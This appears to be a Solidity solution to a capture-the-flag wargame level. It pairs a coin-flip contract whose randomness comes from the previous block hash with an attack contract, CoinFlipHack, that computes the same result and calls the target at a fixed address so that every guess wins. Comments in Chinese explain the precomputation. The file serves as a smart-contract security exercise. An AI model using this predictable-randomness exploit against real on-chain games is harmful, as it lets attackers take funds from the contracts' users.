// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  constructor() {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number-1));
    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue/FACTOR;
    bool side = coinFlip == 1 ? true : false;
    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}

contract CoinFlipHack {
     uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
     // get the instance of your contract.
     CoinFlip ogContract = CoinFlip(0xC2b0a79085908d938533Bb9eeF1f34aa9de86F54);
     uint256 lastHash;
    // 把上面的代码抄下来，提前进行计算true/false，然后在通过区块中打包时候就可以得到相同的答案
     function fliphack() public {
        // get the hash of the previous block
        uint256 blockValue = uint256(blockhash(block.number - 1));

        // if you call flipHack() twice in the same block it will revert
        if (lastHash == blockValue) {
          revert();
        }
    
        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
    
        // 对原来的合约发起请求
        if (side == true) {
            ogContract.flip(true);
        } else {
            ogContract.flip(false);
        }
      }
}